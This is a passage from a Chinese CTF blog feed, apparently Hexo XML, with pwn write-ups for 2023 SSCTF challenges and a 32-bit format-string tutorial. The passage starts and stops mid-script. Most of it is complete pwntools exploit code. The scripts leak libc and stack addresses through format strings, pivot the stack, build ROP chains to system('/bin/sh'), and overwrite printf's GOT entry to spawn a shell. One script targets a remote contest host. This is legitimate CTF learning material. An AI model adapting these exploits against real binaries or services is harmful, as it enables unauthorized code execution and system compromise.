class="number">45</span>+p32(mprotect)+p32(ebp_esi_edi)+p32(got_addr)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload+=p32(read_addr)+p32(ebp_esi_edi)+p32(<span class="number">0</span>)+p32(got_addr)+p32(<span class="number">0xfff</span>)+p32(got_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ssctf-初赛</title>
      <link href="/posts/25731/"/>
      <url>/posts/25731/</url>
      
        <content type="html"><![CDATA[<h2 id="shanxi"><a href="#shanxi" class="headerlink" title="shanxi"></a>shanxi</h2><p>溢出的字节数不够，利用栈迁移获得足够空间构造rop链</p><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;60.204.130.55&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice :\n&#x27;</span>)</span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">2</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%37$p%10$p%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">main_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr))</span><br><span class="line">code_base = main_addr - <span class="number">0x12eb</span></span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libcbase=libc_start_main-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi_ret=<span class="number">0x1433</span> + code_base</span><br><span class="line">leave_ret = <span class="number">0x127f</span> + code_base</span><br><span class="line">ret = <span class="number">0x101a</span> + code_base</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice :\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">payload=p64(pop_rdi_ret)+p64(binsh)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(stack_addr-<span class="number">0x28</span>) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Mountain\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b read&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-printf"><a href="#ez-printf" class="headerlink" title="ez_printf"></a>ez_printf</h2><p>考察了在bss段的格式化字符串，原理不复杂，就是有点麻烦</p><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;TokameinE_is_the_best_pwner\x00&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x1130)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;%11$p.%49$p.%8$p.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">134</span>-<span class="number">0x1595</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(offset))</span><br><span class="line">true=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(true))</span><br><span class="line">libcbase=true-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;0x&#x27;)</span></span><br><span class="line"><span class="comment">#stack_addr_2=int(p.recvuntil(b&#x27;.&#x27;,drop=True),16)</span></span><br><span class="line"><span class="comment">#print(&quot;stack_addr_2:&quot;+hex(stack_addr_2))</span></span><br><span class="line">bin_sh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_sh:&quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr:&quot;</span>+<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">pop_rdi_ret=base+<span class="number">0x16c3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pop_rdi_ret:&quot;</span>+<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">ret=base+<span class="number">0x101a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line">stack_1=stack_addr+<span class="number">0x10</span></span><br><span class="line">stack_2=stack_addr-<span class="number">0x8</span></span><br><span class="line">stack_3=stack_addr+<span class="number">0x8</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_1&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> (stack_1&amp;<span class="number">0xffff</span>)&gt;=(stack_addr&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_addr&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_1&amp;<span class="number">0xffff</span>)-(stack_addr&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_1&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)-(stack_1&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> (sys_addr&amp;<span class="number">0xffff</span>)&gt;=(bin_sh&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(bin_sh&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((sys_addr&amp;<span class="number">0xffff</span>)-(bin_sh&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_addr&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((bin_sh&amp;<span class="number">0xffff</span>)-(sys_addr&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> ((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)&gt;=((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)-((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)-((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> ((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)&gt;=((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> ((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)&gt;=((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)-((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)-((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((sys_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((bin_sh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((bin_sh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span>+<span class="string">b&#x27;%63$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_2&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(pop_rdi_ret&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_3&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_3&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32format-bss</title>
      <link href="/posts/35316/"/>
      <url>/posts/35316/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20171648.png"></p><p>checksec下,看下保护</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20172019.png"></p><p>如图，该函数存在漏洞，分析下函数逻辑，read函数将读取的0x32个字节放入s1中，strncmp函数将s1的前8个字节与“wllmmllw“比较，不同返回非0，执行printf函数，相同返回0，跳出循环。</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20175756.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20180034.png"></p><p>gdb调试，发现printf的参数并不是储存在栈上，而是储存在bss段，所以我们不能直接在栈上写入内容，于是需要借助跳板来在栈上写入相应的值。</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20195544.png"></p><p>这里我们可以借助0xffffd0f8这个跳板，将0xffffd108指向的地址修改为0xffffd0fc，这样我们可以将0xffffd0fc指向的地址修改为我们想要的地址。为什么要修改0xffffd108指向的地址？是因为0xffffd0fc指向的地址高两个字节的地址为0x804，与system高两个字节的地址一致，便于修改，而且这个程序会一直处于while循环，没有leave，ret指令，所以也不用担心修改会破坏程序执行流。于是我们可以将printf函数的got表项的地址写到0xffffd0fc中。同理，我们可以将0xffffd108指向的地址修改为0xffffd10c，并将printf函数的got表项高两个字节地址写入0xffffd10c中。最后，同时修改printf函数的got表项地址指向的printf函数的地址改为system函数的地址，然后在下一次循环中填入&#x2F;bin&#x2F;sh，完成调用。printf函数的got表项地址一定要同时修改，否则printf函数的got表项地址指向的是无效的地址，导致程序的崩溃。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">p=process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;mikokuma&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%43$p.%6$p.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;password: 0x&#x27;</span>)</span><br><span class="line">true_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">147</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(true_addr))</span><br><span class="line"></span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">p.recv()</span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">base=true_addr-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys_offset=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr=base+sys_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)-<span class="number">0xc</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80485AF&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_got))</span><br><span class="line">payload2=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_got&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span 